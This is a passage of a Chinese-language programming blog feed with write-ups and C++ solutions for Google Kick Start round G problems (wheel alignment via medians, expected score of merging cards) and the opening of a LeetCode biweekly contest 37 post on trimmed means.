values 1 through N on it, in ascending order.</p><p>At any moment, each wheel shows a specific value on it. Xi is the initial value shown on the i-th wheel.</p><p>You can use a single move to change a wheel from showing the value X to showing either X+1 or X-1, wrapping around between 1 and N. For example, if a wheel currently shows the value 1, in one move you can change its value to 2 or N.</p><p>Given all wheels’ initial values, what is the minimum number of moves to get all wheels to show the same value?</p><p><strong>Input</strong><br>The first line of the input gives the number of test cases, T. T test cases follow.</p><p>The first line of each test case contains the two integers W and N.</p><p>The second line contains W integers. The i-th integer is Xi.</p><p><strong>Output</strong><br>For each test case, output one line containing Case #x: y, where x is the test case number (starting from 1) and y is the minimum number of moves to get all wheels to show the same value.</p><p>给定<code>w</code>个数，所有的元素都可以在<code>1~n</code>之间进行循环移动，求将所有的元素移为同一个元素的最小操作数。</p><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/00000000001a0069/0000000000414a24" target="_blank" rel="noopener">https://codingcompetitions.withgoogle.com/kickstart/round/00000000001a0069/0000000000414a24</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 中位数</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>这个题目非常有意思，如果没有循环移动的话，当然很简单，我们知道所有的元素与中位数的距离之和最小，我们直接求前半部分元素和后半部分元素的差即可。</li><li>二分查找： 我们对所有的元素进行排序，然后遍历枚举<code>1~n</code>,我们可以用二分查找即可，每次枚举的数<code>i</code>,找到符合以下条件的：<script type="math/tex; mode=display">x + n - i < i - x \\x - i > n -x + i</script>化简后可得如下：<script type="math/tex; mode=display">x < i - n/2 \\x > i + n/2 \\</script>我们令$l = [i-n/2], r = [i + n/2]$,我们可以知道如果在[l,r]范围之内的数，我们直接移动$abs(x-i)$即可，在$[0,l),(r,n]$范围内的我们则进行翻转即可。算法的时间复杂度为$O(n\lg{w})$</li><li>求中位数，我们可以肯定的知道最终的目标数一定为$[1,n]$中的某个数，则我们可以每次将前<code>i</code>个数进行轮转，因为我们根据<code>2</code>的结论可以知道，最终的数只有最左边的数进行轮转或者最右边的部分元素进行轮转。则此时我们应该则数组后面加上<code>n + A[i]</code>即可，$(n + A[i] - x)$即等价于轮转。</li><li>我们即可用中位数即可，每次利用滑动窗口即可。题目还是非常有思考深度的题目。确实是好题目。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">int</span> matrix[<span class="number">1001</span>][<span class="number">1001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> w,n;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = INT_MAX;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> curr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;w&gt;&gt;n;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr(w);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; w; ++i)&#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(arr.begin(),arr.end());</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; w; ++i)&#123;</span><br><span class="line">        arr.push_back(arr[i]+n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; w; ++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i &lt; w/<span class="number">2</span>)&#123;</span><br><span class="line">            curr = curr - arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i &gt;= (w+<span class="number">1</span>)/<span class="number">2</span>)&#123;</span><br><span class="line">            curr = curr + arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans = curr;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; w; ++i)&#123;</span><br><span class="line">        curr += (arr[i + w] - arr[i + (w+<span class="number">1</span>)/<span class="number">2</span>]) - (arr[i + w/<span class="number">2</span>] - arr[i]);</span><br><span class="line">        ans = min(ans,curr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove1</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> w,n;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;w&gt;&gt;n;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr(w);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; w; ++i)&#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(arr.begin(),arr.end());</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)&#123;</span><br><span class="line">        (i + n/<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="4-Merge-Cards"><a href="#4-Merge-Cards" class="headerlink" title="4.Merge Cards"></a>4.Merge Cards</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p><strong>Problem</strong><br>Panko is playing a game with N cards laid out in a row. The i-th card has the integer Ai written on it.</p><p>The game is played in N - 1 rounds. During each round Panko will pick an adjacent pair of cards and merge them. Suppose that the cards have the integers X and Y written on them. To merge two cards, Panko creates a new card with X + Y written on it. He then removes the two original cards from the row and places the new card in their old position. Finally Panko receives X + Y points for the merge. During each round Panko will pick a pair of adjacent cards uniformly at random amongst the set of all available adjacent pairs.</p><p>After all N - 1 rounds, Panko’s total score is the sum of points he received for each merge. What is the expected value of Panko’s total score at the end of the game?</p><p><strong>Input</strong><br>The first line of the input gives the number of test cases, T. T test cases follow. Each test case begins with a line containing the integer N. A second line follows containing N integers, describing the initial row of cards. The i-th integer is Ai.</p><p><strong>Output</strong><br>For each test case, output one line containing Case #x: y, where x is the test case number (starting from 1) and y is the expected total score at the end of the game.</p><p>y will be considered correct if it is within an absolute or relative error of 10-6 of the correct answer. See the FAQ for an explanation of what that means, and what formats of real numbers we accept.<br>对数组中的相邻元素$x,y$进行合并，每次合并可以得分为$x+y$,求数组所有合并后得分的期望。</p><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/00000000001a0069/0000000000415054" target="_blank" rel="noopener">https://codingcompetitions.withgoogle.com/kickstart/round/00000000001a0069/0000000000415054</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 动态规划</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>我们设<code>dp[i][j]</code>为元素从<code>A[i]</code>到<code>A[j]</code>的期望，则我们知道序列<code>A[1]</code>到<code>A[n]</code>可以有<code>n-1</code>种可能的分法，在下列分法种我们将每种分法的得分期望相加，再除以<code>n-1</code>即可。<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">A1</span>, <span class="built_in">A2</span> + <span class="built_in">A3</span> + ... + AN</span><br><span class="line"><span class="built_in">A1</span> + <span class="built_in">A2</span>, <span class="built_in">A3</span> + <span class="built_in">A4</span> + ... + AN</span><br><span class="line">⋮</span><br><span class="line"><span class="built_in">A1</span> + <span class="built_in">A2</span> + ... + Ai, Ai + <span class="number">1</span> + Ai + <span class="number">2</span> + ... + AN</span><br><span class="line">⋮</span><br><span class="line"><span class="built_in">A1</span> + <span class="built_in">A2</span> + ... + AN - <span class="number">1</span>, AN</span><br></pre></td></tr></table></figure><script type="math/tex; mode=display">dp[i][j] = \frac{\sum_{k=i+1}^{j-2}(dp[i][k] + dp[k+1][j])}{j-i} + \sum_{k=i}^{j}A[k]</script></li><li>算法时间复杂度为$O(n^{3})$.<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">long</span> <span class="keyword">long</span> MOD = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fastpower</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">1</span>) <span class="keyword">return</span> x;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">double</span> ans = <span class="number">0.0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr(n);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">double</span>&gt; sum(n+<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">double</span>&gt;&gt; dp(n,<span class="built_in">vector</span>&lt;<span class="keyword">double</span>&gt;(n));</span><br><span class="line"></span><br><span class="line">    sum[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">        dp[i][i] = <span class="number">0</span>;</span><br><span class="line">        sum[i+<span class="number">1</span>] = sum[i] + arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j + i &lt; n; ++j)&#123;</span><br><span class="line">            dp[j][j+i] = <span class="number">0.0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = j ; k &lt; j+i; ++k)&#123;</span><br><span class="line">                dp[j][j+i] += <span class="keyword">double</span>(dp[j][k] + dp[k+<span class="number">1</span>][j+i])/i;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[j][j+i] += sum[j+i+<span class="number">1</span>] - sum[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.6lf\n"</span>,dp[<span class="number">0</span>][n<span class="number">-1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;google-kick-start-round-G&quot;&gt;&lt;a href=&quot;#google-kick-start-round-G&quot; class=&quot;headerlink&quot; title=&quot;google  kick start round G&quot;&gt;&lt;/a&gt;google  kick start round G&lt;/h1&gt;&lt;p&gt;&lt;code&gt;google&lt;/code&gt;的&lt;code&gt;kick start&lt;/code&gt;质量还是非常高，思考深度比&lt;code&gt;leetcode&lt;/code&gt;有意思多了。代码量都不太大，但是很有意思。&lt;/p&gt;&lt;h2 id=&quot;1-Kick-Start&quot;&gt;&lt;a href=&quot;#1-Kick-Start&quot; class=&quot;headerlink&quot; title=&quot;1.Kick_Start&quot;&gt;&lt;/a&gt;1.Kick_Start&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;Ksenia is very fond of reading so she kicks off each day by reading a fragment from her favourite book before starting with the rest of her morning routine. A fragment is simply a substring of the text. Ksenia is somewhat superstitious and believes that her day will be lucky if the fragment she reads starts with the string KICK, then goes on with 0 or more characters, and eventually ends with the string START, even if the overall fragment makes little sense.&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="kickstart" scheme="http://yoursite.com/tags/kickstart/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】 双周赛37</title>
    <link href="http://yoursite.com/2020/10/20/214/"/>
    <id>http://yoursite.com/2020/10/20/214/</id>
    <published>2020-10-20T06:15:40.564Z</published>
    <updated>2020-10-21T13:17:09.880Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-biweekly-contest-37"><a href="#leetcode-biweekly-contest-37" class="headerlink" title="leetcode biweekly contest 37"></a>leetcode biweekly contest 37</h1><p>本周的双周赛题目质量不错，只做出了前三题。思考的地方有许多。<br><img src="https://i.loli.net/2020/10/18/k8uP3gozF1rxXE6.png" alt="1"></p><h2 id="5122-删除某些元素后的数组均值"><a href="#5122-删除某些元素后的数组均值" class="headerlink" title="5122. 删除某些元素后的数组均值"></a>5122. 删除某些元素后的数组均值</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给你一个整数数组 <code>arr</code> ，请你删除最小 <code>5%</code> 的数字和最大 5% 的数字后，剩余数字的平均值。</p><p>与 标准答案 误差在 <code>10-5</code>的结果都被视为正确结果。</p><a id="more"></a><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">输出：<span class="number">2.00000</span></span><br><span class="line">解释：删除数组中最大和最小的元素后，所有元素都等于 <span class="number">2</span>，所以平均值为 <span class="number">2</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [<span class="number">6</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>]</span><br><span class="line">输出：<span class="number">4.00000</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [<span class="number">6</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">输出：<span class="number">4.77778</span></span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [<span class="number">9</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">3</span>]</span><br><span class="line">输出：<span class="number">5.27778</span></span><br></pre></td></tr></table></figure><br>示例 5：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [<span class="number">4</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">5.29167</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>20 &lt;= arr.length &lt;= 1000</code></li><li><code>arr.length</code> 是 20 的 倍数 </li><li><code>0 &lt;= arr[i] &lt;= 105</code></li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/mean-of-array-after-removing-some-elements" target="_blank" rel="noopener">https://leetcode-cn.com/problems/mean-of-array-after-removing-some-elements</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  排序</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>排序即可，去掉前面百分之五的元素，去掉后面百分之五的元素，剩余的元素求合即可。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">trimMean</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> sum = <span class="number">0.0</span>;</span><br><span class="line">        sort(arr.begin(),arr.end());</span><br><span class="line">        <span class="keyword">int</span> n = arr.size();</span><br><span class="line">        <span class="keyword">int</span> remove = n/<span class="number">20</span>;</span><br><span class="line">        <span 